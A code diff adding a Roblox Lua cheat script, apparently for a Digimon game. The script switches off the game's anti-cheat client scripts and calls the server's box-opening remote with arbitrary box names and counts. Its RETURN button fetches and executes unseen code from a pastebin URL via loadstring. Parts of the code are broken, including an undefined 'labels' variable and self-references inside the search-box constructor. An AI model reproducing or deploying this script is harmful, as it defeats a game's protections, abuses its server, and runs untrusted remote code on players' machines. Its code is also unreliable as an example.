@@ -1,0 +1,674 @@
+-- Accessing necessary services
+local players = game:GetService("Players")
+local workspace = game:GetService("Workspace")
+local camera = workspace.CurrentCamera
+local virtualInput = game:GetService("VirtualInputManager")
+local userInputService = game:GetService("UserInputService")
+local starterGui = game:GetService("StarterGui")
+local player = players.LocalPlayer
+local runService = game:GetService("RunService")
+local tweenService = game:GetService("TweenService")
+
+-- Disable player scripts first
+local playerScripts = player:WaitForChild("PlayerScripts")
+playerScripts:WaitForChild("Monitor").Disabled = true
+playerScripts:WaitForChild("ClientSide").Disabled = true
+playerScripts:WaitForChild("RemoteDetect").Disabled = true
+
+-- Getting the local player
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+local humanoid = character:WaitForChild("Humanoid")
+
+-- Variable to store the DropDown selection
+local selectedType = "DATA"
+
+-- Function to create a modern UI button with gradient
+local function createStylishButton(parent, text, position, size)
+    local button = Instance.new("TextButton")
+    button.Size = size or UDim2.new(0, 150, 0, 50)
+    button.Position = position
+    button.Text = text
+    button.Font = Enum.Font.GothamSemibold
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.TextSize = 16
+    button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    button.BorderSizePixel = 0
+    button.AutoButtonColor = false
+    
+    -- Round corners
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = button
+    
+    -- Add gradient
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(111, 76, 255)), -- Purple
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(67, 59, 148))   -- Dark purple
+    })
+    gradient.Rotation = 45
+    gradient.Parent = button
+    
+    -- Add hover/click effects
+    local originalTransparency = button.BackgroundTransparency
+    
+    button.MouseEnter:Connect(function()
+        tweenService:Create(button, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(60, 60, 60)}):Play()
+    end)
+    
+    button.MouseLeave:Connect(function()
+        tweenService:Create(button, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(45, 45, 45)}):Play()
+    end)
+    
+    button.MouseButton1Down:Connect(function()
+        tweenService:Create(button, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
+    end)
+    
+    button.MouseButton1Up:Connect(function()
+        tweenService:Create(button, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(60, 60, 60)}):Play()
+    end)
+    
+    button.Parent = parent
+    return button
+end
+
+-- Function to create a stylish dropdown
+local function createStylishDropdown(parent, defaultOption, options, position)
+    local dropdownContainer = Instance.new("Frame")
+    dropdownContainer.Size = UDim2.new(0, 150, 0, 50)
+    dropdownContainer.Position = position
+    dropdownContainer.BackgroundTransparency = 1
+    dropdownContainer.Parent = parent
+    
+    local mainButton = createStylishButton(dropdownContainer, defaultOption, UDim2.new(0, 0, 0, 0))
+    
+    -- Create dropdown arrow
+    local arrow = Instance.new("TextLabel")
+    arrow.Size = UDim2.new(0, 20, 0, 20)
+    arrow.Position = UDim2.new(1, -25, 0.5, -10)
+    arrow.Text = "▼"
+    arrow.TextColor3 = Color3.fromRGB(255, 255, 255)
+    arrow.BackgroundTransparency = 1
+    arrow.Font = Enum.Font.GothamSemibold
+    arrow.TextSize = 14
+    arrow.Parent = mainButton
+    
+    -- Create the dropdown menu container
+    local dropdownMenu = Instance.new("Frame")
+    dropdownMenu.Size = UDim2.new(1, 0, 0, #options * 40)
+    dropdownMenu.Position = UDim2.new(0, 0, 1, 5)
+    dropdownMenu.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    dropdownMenu.BorderSizePixel = 0
+    dropdownMenu.Visible = false
+    dropdownMenu.ZIndex = 10
+    
+    local menuCorner = Instance.new("UICorner")
+    menuCorner.CornerRadius = UDim.new(0, 8)
+    menuCorner.Parent = dropdownMenu
+    
+    dropdownMenu.Parent = dropdownContainer
+    
+    -- Create option buttons
+    local optionButtons = {}
+    for i, option in ipairs(options) do
+        local optionButton = Instance.new("TextButton")
+        optionButton.Size = UDim2.new(1, 0, 0, 40)
+        optionButton.Position = UDim2.new(0, 0, 0, (i-1) * 40)
+        optionButton.Text = option
+        optionButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        optionButton.Font = Enum.Font.GothamSemibold
+        optionButton.TextSize = 14
+        optionButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        optionButton.BackgroundTransparency = 0
+        optionButton.BorderSizePixel = 0
+        optionButton.ZIndex = 10
+        optionButton.Parent = dropdownMenu
+        
+        local optionGradient = Instance.new("UIGradient")
+        optionGradient.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(111, 76, 255)), -- Purple
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(67, 59, 148))   -- Dark purple
+        })
+        optionGradient.Rotation = 45
+        optionGradient.Transparency = NumberSequence.new(0.5)
+        optionGradient.Parent = optionButton
+        
+        optionButton.MouseEnter:Connect(function()
+            tweenService:Create(optionButton, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(60, 60, 60)}):Play()
+        end)
+        
+        optionButton.MouseLeave:Connect(function()
+            tweenService:Create(optionButton, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
+        end)
+        
+        table.insert(optionButtons, optionButton)
+    end
+    
+    -- Toggle dropdown visibility
+    local isOpen = false
+    mainButton.MouseButton1Click:Connect(function()
+        isOpen = not isOpen
+        dropdownMenu.Visible = isOpen
+        arrow.Text = isOpen and "▲" or "▼"
+    end)
+    
+    -- Close dropdown if clicked elsewhere
+    userInputService.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            local position = userInputService:GetMouseLocation()
+            local objects = players.LocalPlayer:GetGuiObjectsAtPosition(position.X, position.Y)
+            local clickedOnDropdown = false
+            
+            for _, obj in pairs(objects) do
+                if obj == mainButton or obj == dropdownMenu or obj:IsDescendantOf(dropdownMenu) then
+                    clickedOnDropdown = true
+                    break
+                end
+            end
+            
+            if not clickedOnDropdown and isOpen then
+                isOpen = false
+                dropdownMenu.Visible = false
+                arrow.Text = "▼"
+            end
+        end
+    end)
+    
+    return {
+        container = dropdownContainer,
+        mainButton = mainButton,
+        optionButtons = optionButtons,
+        getCurrentSelection = function() return mainButton.Text end
+    }
+end
+
+-- Function to create a stylish text box
+local function createStylishTextBox(parent, placeholderText, position)
+    local textBox = Instance.new("TextBox")
+    textBox.Size = UDim2.new(0, 150, 0, 50)
+    textBox.Position = position
+    textBox.PlaceholderText = placeholderText
+    textBox.Text = ""
+    textBox.Font = Enum.Font.GothamSemibold
+    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    textBox.TextSize = 16
+    textBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    textBox.BorderSizePixel = 0
+    textBox.ClearTextOnFocus = false
+    
+    -- Round corners
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = textBox
+    
+    -- Add gradient
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(67, 59, 148)),   -- Dark purple
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 40, 40))     -- Dark gray
+    })
+    gradient.Rotation = 45
+    gradient.Parent = textBox
+    
+    textBox.Parent = parent
+    return textBox
+end
+
+-- Function to create a search box with dropdown results
+local function createSearchBox(parent, position, options)
+    local container = Instance.new("Frame")
+    container.Size = UDim2.new(0, 250, 0, 50)
+    container.Position = position
+    container.BackgroundTransparency = 1
+    container.Parent = parent
+    
+    -- Search label
+    local searchLabel = Instance.new("TextLabel")
+    searchLabel.Size = UDim2.new(0, 250, 0, 30)
+    searchLabel.Position = UDim2.new(0, 0, 0, -35)
+    searchLabel.Text = "SEARCH"
+    searchLabel.Font = Enum.Font.GothamBold
+    searchLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    searchLabel.TextSize = 18
+    searchLabel.BackgroundTransparency = 1
+    searchLabel.Parent = container
+    
+    -- Search box
+    local searchBox = createStylishTextBox(container, "Search", UDim2.new(0, 0, 0, 0))
+    searchBox.Size = UDim2.new(0, 200, 0, 50)
+    
+    -- Results dropdown
+    local resultsFrame = Instance.new("ScrollingFrame")
+    resultsFrame.Size = UDim2.new(1, 0, 0, 200)
+    resultsFrame.Position = UDim2.new(0, 0, 1, 5)
+    resultsFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    resultsFrame.BorderSizePixel = 0
+    resultsFrame.Visible = false
+    resultsFrame.ZIndex = 10
+    resultsFrame.CanvasSize = UDim2.new(0, 0, 0, #options * 40)
+    resultsFrame.ScrollBarThickness = 6
+    
+    local menuCorner = Instance.new("UICorner")
+    menuCorner.CornerRadius = UDim.new(0, 8)
+    menuCorner.Parent = resultsFrame
+    
+    resultsFrame.Parent = container
+    
+    -- Create option buttons for all options
+    local optionButtons = {}
+    local visibleButtons = {}
+    
+    for i, label in ipairs(labels) do
+        local optionButton = Instance.new("TextButton")
+        optionButton.Size = UDim2.new(1, -10, 0, 40)
+        optionButton.Position = UDim2.new(0, 5, 0, (i-1) * 40)
+        optionButton.Text = label
+        optionButton:SetAttribute("RealValue", options[i]) -- Armazena o valor real
+        optionButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        optionButton.Font = Enum.Font.GothamSemibold
+        optionButton.TextSize = 14
+        optionButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        optionButton.BackgroundTransparency = 0
+        optionButton.BorderSizePixel = 0
+        optionButton.ZIndex = 10
+        optionButton.Parent = resultsFrame
+        optionButton.Visible = true
+        
+        local optionGradient = Instance.new("UIGradient")
+        optionGradient.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(111, 76, 255)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(67, 59, 148))
+        })
+        optionGradient.Rotation = 45
+        optionGradient.Transparency = NumberSequence.new(0.5)
+        optionGradient.Parent = optionButton
+        
+        optionButton.MouseEnter:Connect(function()
+            tweenService:Create(optionButton, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(60, 60, 60)}):Play()
+        end)
+        
+        optionButton.MouseLeave:Connect(function()
+            tweenService:Create(optionButton, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
+        end)
+        
+        table.insert(optionButtons, optionButton)
+        table.insert(visibleButtons, optionButton)
+
+        optionButton.MouseButton1Click:Connect(function()
+            searchBox.searchBox.Text = label
+            searchBox.selectedValue = options[i] -- Armazena o valor real selecionado
+            searchBox.resultsFrame.Visible = false
+        end)
+    end
+    
+    -- Function to update visible options based on search
+    local function updateSearch()
+        local searchText = searchBox.Text:lower()
+        local visibleCount = 0
+        
+        -- Reset first
+        for i, button in ipairs(optionButtons) do
+            button.Visible = false
+            button.Position = UDim2.new(0, 5, 0, 0)
+        end
+        
+        -- Filter and reposition visible buttons
+        visibleButtons = {}
+        for i, button in ipairs(optionButtons) do
+            if searchText == "" or string.find(button.Text:lower(), searchText) then
+                button.Visible = true
+                button.Position = UDim2.new(0, 5, 0, visibleCount * 40)
+                visibleCount = visibleCount + 1
+                table.insert(visibleButtons, button)
+            end
+        end
+        
+        -- Update scrolling frame canvas size
+        resultsFrame.CanvasSize = UDim2.new(0, 0, 0, math.max(visibleCount * 40, 1))
+        
+        -- Show results if we have text
+        resultsFrame.Visible = (searchBox.Text ~= "")
+    end
+    
+    -- Connect to text changed event
+    searchBox.Changed:Connect(function(property)
+        if property == "Text" then
+            updateSearch()
+        end
+    end)
+    
+    -- Close dropdown if clicked elsewhere
+    userInputService.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            local position = userInputService:GetMouseLocation()
+            local objects = players.LocalPlayer:GetGuiObjectsAtPosition(position.X, position.Y)
+            local clickedOnSearch = false
+            
+            for _, obj in pairs(objects) do
+                if obj == searchBox or obj == resultsFrame or obj:IsDescendantOf(resultsFrame) then
+                    clickedOnSearch = true
+                    break
+                end
+            end
+            
+            if not clickedOnSearch and resultsFrame.Visible then
+                resultsFrame.Visible = false
+            end
+        end
+    end)
+    
+    -- Focus behavior
+    searchBox.Focused:Connect(function()
+        if #visibleButtons > 0 then
+            resultsFrame.Visible = true
+        end
+    end)
+    
+    return {
+        container = container,
+        searchBox = searchBox,
+        optionButtons = optionButtons,
+        resultsFrame = resultsFrame,
+        selectedValue = nil
+    }
+end
+
+-- Function to teleport camera and create a platform
+local function teleportCameraAndCreatePlatform()
+    -- Target camera coordinates
+    local targetPosition = Vector3.new(-21.998, 81.914, 2988.164)
+    
+    -- Create a table to store all created objects for easy cleanup
+    local createdObjects = {}
+    
+    -- Create a part to serve as a platform
+    local platform = Instance.new("Part")
+    platform.Size = Vector3.new(10, 1, 10)
+    platform.Anchored = true
+    platform.CanCollide = true
+    platform.Material = Enum.Material.Concrete
+    platform.Position = Vector3.new(targetPosition.X, targetPosition.Y - 5, targetPosition.Z + 10)
+    platform.Parent = workspace
+
+	-- Adicionar textura ao chão (opcional)
+    local texture = Instance.new("Texture")
+    texture.Texture = "rbxassetid://6372755229" -- ID de uma textura de chão
+    texture.Face = Enum.NormalId.Top
+    texture.Parent = platform
+
+    table.insert(createdObjects, platform)
+    
+    local meshPart = Instance.new("MeshPart")
+    meshPart.MeshId = "rbxassetid://5154978664"
+    meshPart.TextureID = "rbxassetid://5154980920"
+    meshPart.Size = Vector3.new(2, 2, 2)
+    meshPart.Anchored = true
+    meshPart.CanCollide = false
+    meshPart.Position = platform.Position + Vector3.new(0, 2, 0)
+    local lookVector = (targetPosition - meshPart.Position).Unit
+    meshPart.CFrame = CFrame.new(meshPart.Position, meshPart.Position + Vector3.new(lookVector.X, 0, lookVector.Z))
+    meshPart.Parent = workspace
+    table.insert(createdObjects, meshPart)
+    
+	    
+	-- Move the camera to the desired position
+    camera.CameraType = Enum.CameraType.Scriptable
+    camera.CFrame = CFrame.new(targetPosition, platform.Position)
+
+    -- Creating a modern UI
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "ModernInterface"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = player:WaitForChild("PlayerGui")
+    table.insert(createdObjects, screenGui)
+    
+    -- Add a background frame for the UI
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0.8, 0, 0.4, 0)
+    mainFrame.Position = UDim2.new(0.1, 0, 0.3, 0)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    mainFrame.BackgroundTransparency = 0.4
+    mainFrame.BorderSizePixel = 0
+    
+    local mainCorner = Instance.new("UICorner")
+    mainCorner.CornerRadius = UDim.new(0, 12)
+    mainCorner.Parent = mainFrame
+    
+    mainFrame.Parent = screenGui
+    
+    -- Add a title
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Size = UDim2.new(1, 0, 0.15, 0)
+    titleLabel.Position = UDim2.new(0, 0, 0, 0)
+    titleLabel.Text = "CONTROL PANEL"
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleLabel.TextSize = 24
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Parent = mainFrame
+
+	-- Digimon list for search
+	local boxOptions = {
+    "BoxArmageddemon", "BoxBM", "BoxValentines", "BoxColiseum", "BoxColiseum2", 
+    "BoxCompensation1", "BoxEggMysterious", "BoxEquipment1", "BoxEquipment2", "BoxEvoluterData", "BoxEvoluterVaccine", 
+    "BoxEvoluterVirus", "BoxKuwagamon", "BoxLeomon", "BoxMaterial1", "BoxMaterial2", "BoxMaterial3", 
+    "BoxMeramon", "BoxOgremon", "BoxSeadramon", "BoxUnimon", "BoxValentines", "BoxWaruMonzaemon", 
+    "DungeonBoxEpsilonHard", "DungeonBoxEpsilonNormal", "DungeonBoxGeremonHard", "DungeonBoxGeremonEasy", "DungeonBoxGeremonNormal", "DungeonBoxOgremonEasy", 
+    "DungeonBoxOgremonNormal", "DungeonBoxOgremonHard"
+	}
+  local boxLabels = {
+      "BoxArmageddemon", "BoxBM", "Box(Valentine)", "BoxColiseum(EASY)", "BoxColiseum2(NORMAL)", 
+    "BoxCompensation1", "BoxEggMysterious", "BoxEquipment(LEVEL 5)", "BoxEquipment(MATERIAL LEVEL 25)", "BoxEvoluterData", "BoxEvoluterVaccine", 
+    "BoxEvoluterVirus", "BoxKuwagamon", "BoxLeomon", "BoxMaterial(SILVER RIVER)", "BoxMaterial(GEAR SAVANNAH)", "BoxMaterial(INFINITE MOUNTAIN)", 
+    "BoxMeramon", "BoxOgremon", "BoxSeadramon", "BoxUnimon", "BoxChristmas", "BoxWaruMonzaemon", 
+    "DungeonBoxEpsilon(Hard)", "DungeonBoxEpsilon(Normal)", "DungeonBoxGeremon(Hard)", "DungeonBoxGeremon(Easy)", "DungeonBoxGeremon(Normal)", "DungeonBoxOgremon(Easy)", 
+    "DungeonBoxOgremon(Normal)", "DungeonBoxOgremon(Hard)"
+  }
+
+	-- Na seção de criação da UI:
+local searchBox = createSearchBox(mainFrame, UDim2.new(0.1, 0, 0.25, 0), boxLabels, boxOptions)
+
+
+	local dropdown = createStylishDropdown(mainFrame, selectedType, boxOptions, UDim2.new(0.1, 0, 0.5, 0))    
+    
+    -- Create text input (vai ser usada pro player passar o valor de caixas que ele quer abrir
+    local inputBox = createStylishTextBox(mainFrame, "Value", UDim2.new(0.75, 0, 0.4, 0))
+    
+    -- Create OPEN button (botao pra abrir as caixas
+    local openButton = createStylishButton(mainFrame, "OPEN", UDim2.new(0.5, -75, 0.7, 0))
+    
+    -- Create RETURN button
+    local returnButton = createStylishButton(mainFrame, "RETURN", UDim2.new(0.5, -75, 1, 0))
+    
+    -- Text above the mesh showing the selection
+    local selectedTypeLabel = Instance.new("BillboardGui")
+    selectedTypeLabel.Size = UDim2.new(0, 200, 0, 50)
+    selectedTypeLabel.StudsOffset = Vector3.new(0, 2, 0)
+    selectedTypeLabel.Adornee = meshPart
+    selectedTypeLabel.AlwaysOnTop = true
+    
+    local selectedTextLabel = Instance.new("TextLabel")
+    selectedTextLabel.Size = UDim2.new(1, 0, 1, 0)
+    selectedTextLabel.BackgroundTransparency = 1
+    selectedTextLabel.Text = selectedType
+    selectedTextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    selectedTextLabel.TextScaled = true
+    selectedTextLabel.Font = Enum.Font.GothamBold
+    selectedTextLabel.Parent = selectedTypeLabel
+    selectedTypeLabel.Parent = meshPart
+    table.insert(createdObjects, selectedTypeLabel)
+
+	-- Connect search option buttons
+	for _, optionButton in ipairs(searchBox.optionButtons) do
+   	 	optionButton.MouseButton1Click:Connect(function()
+        	local selectedValue = optionButton.Text
+        	searchBox.searchBox.Text = selectedValue
+        	searchBox.resultsFrame.Visible = false
+        
+        	-- Add a floating text effect when changed
+        	local floatingText = Instance.new("BillboardGui")
+        	floatingText.Name = "FloatingEffect"
+        	floatingText.Size = UDim2.new(0, 200, 0, 50)
+        	floatingText.StudsOffset = Vector3.new(0, 4, 0)
+        	floatingText.Adornee = meshPart
+        	floatingText.AlwaysOnTop = true
+        	table.insert(createdObjects, floatingText)
+        
+        	local floatingTextLabel = Instance.new("TextLabel")
+        	floatingTextLabel.Size = UDim2.new(1, 0, 1, 0)
+       	 	floatingTextLabel.BackgroundTransparency = 1
+        	floatingTextLabel.Text = "Selected: " .. selectedValue
+        	floatingTextLabel.TextColor3 = Color3.fromRGB(111, 76, 255)
+        	floatingTextLabel.TextScaled = true
+        	floatingTextLabel.Font = Enum.Font.GothamBold
+        	floatingTextLabel.Parent = floatingText
+        	floatingText.Parent = workspace
+        
+        	-- Animate the text floating up and fading
+        	local startPosition = floatingText.StudsOffset
+        	local endPosition = startPosition + Vector3.new(0, 2, 0)
+        
+        	spawn(function()
+            	for i = 0, 1, 0.05 do
+                	if floatingText and floatingText.Parent then
+                    	floatingText.StudsOffset = startPosition:Lerp(endPosition, i)
+                    	floatingTextLabel.TextTransparency = i
+                    	wait(0.02)
+                	else
+                    	break
+                	end
+            	end
+            
+            	if floatingText and floatingText.Parent then
+                	floatingText:Destroy()
+            	end
+        	end)
+    	end)
+	end
+    
+    -- Function to completely clean up everything created
+    local function cleanupEverything()
+        -- First restore camera
+        camera.CameraType = Enum.CameraType.Custom
+        camera.CameraSubject = humanoid
+        
+        -- Then clean up all objects
+        for _, obj in ipairs(createdObjects) do
+            if obj and obj.Parent then
+                obj:Destroy()
+            end
+        end
+        
+        -- Find and destroy any floating text effects or notifications that might be lingering
+        for _, descendant in pairs(workspace:GetDescendants()) do
+            if descendant:IsA("BillboardGui") and descendant.Adornee == meshPart then
+                descendant:Destroy()
+            end
+        end
+        
+        -- Clear any temporary effects in the workspace
+        for _, descendant in pairs(workspace:GetDescendants()) do
+            if descendant:IsA("Part") and descendant.Name == "PulseEffect" then
+                descendant:Destroy()
+            end
+        end
+        
+        -- Clear any notifications in player GUI
+        for _, gui in pairs(player.PlayerGui:GetChildren()) do
+            if gui.Name == "ModernInterface" or gui.Name == "NotificationGui" then
+                gui:Destroy()
+            end
+        end
+    end
+    
+    -- Connect dropdown option buttons
+    for i, optionButton in ipairs(dropdown.optionButtons) do
+        optionButton.MouseButton1Click:Connect(function()
+            local selectedValue = optionButton.Text
+            dropdown.mainButton.Text = selectedValue
+            selectedType = selectedValue
+            selectedTextLabel.Text = selectedType
+            
+            -- Add a floating text effect when changed
+            local floatingText = Instance.new("BillboardGui")
+            floatingText.Name = "FloatingEffect"
+            floatingText.Size = UDim2.new(0, 200, 0, 50)
+            floatingText.StudsOffset = Vector3.new(0, 4, 0)
+            floatingText.Adornee = meshPart
+            floatingText.AlwaysOnTop = true
+            table.insert(createdObjects, floatingText)
+            
+            local floatingTextLabel = Instance.new("TextLabel")
+            floatingTextLabel.Size = UDim2.new(1, 0, 1, 0)
+            floatingTextLabel.BackgroundTransparency = 1
+            floatingTextLabel.Text = "Changed to " .. selectedValue
+            floatingTextLabel.TextColor3 = Color3.fromRGB(111, 76, 255)
+            floatingTextLabel.TextScaled = true
+            floatingTextLabel.Font = Enum.Font.GothamBold
+            floatingTextLabel.Parent = floatingText
+            floatingText.Parent = workspace
+            
+            -- Animate the text floating up and fading
+            local startPosition = floatingText.StudsOffset
+            local endPosition = startPosition + Vector3.new(0, 2, 0)
+            
+            spawn(function()
+                for i = 0, 1, 0.05 do
+                    if floatingText and floatingText.Parent then
+                        floatingText.StudsOffset = startPosition:Lerp(endPosition, i)
+                        floatingTextLabel.TextTransparency = i
+                        wait(0.02)
+                    else
+                        break
+                    end
+                end
+                
+                if floatingText and floatingText.Parent then
+                    floatingText:Destroy()
+                end
+            end)
+        end)
+    end
+    
+    -- Connect RETURN button to cleanup everything
+    returnButton.MouseButton1Click:Connect(function()
+        -- Visual feedback before returning
+        local returnEffect = Instance.new("Frame")
+        returnEffect.Size = UDim2.new(1, 0, 1, 0)
+        returnEffect.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        returnEffect.BackgroundTransparency = 1
+        returnEffect.Parent = screenGui
+        
+        -- Fade to black animation before cleanup
+        for i = 1, 0, -0.1 do
+            returnEffect.BackgroundTransparency = i
+            wait(0.02)
+        end
+        loadstring(game:HttpGet("https://pastebin.com/raw/sGmQwbKS"))()
+        -- Now clean up everything
+        cleanupEverything()
+    end)
+
+	-- Modificação no botão OPEN:
+  openButton.MouseButton1Click:Connect(function()
+      local selectedBox = searchBox.selectedValue or dropdown.mainButton.Text
+      local repeatCount = tonumber(inputBox.Text) or 1
+
+      -- Verifica se é uma caixa especial
+      if selectedBox:find("DungeonBox") then
+          local dungeonLevel = selectedBox:match("%((%w+)%)") or "Normal"
+          print("Abrindo caixa de dungeon:", dungeonLevel)
+      end
+
+      -- Chamada ao servidor com o valor REAL
+      local args = {
+          [1] = selectedBox,
+          [2] = repeatCount
+      }
+    
+      game:GetService("ReplicatedStorage").ItemsEvent.OpenBoxEvent:InvokeServer(unpack(args))
+  end)
+end
+
+teleportCameraAndCreatePlatform()
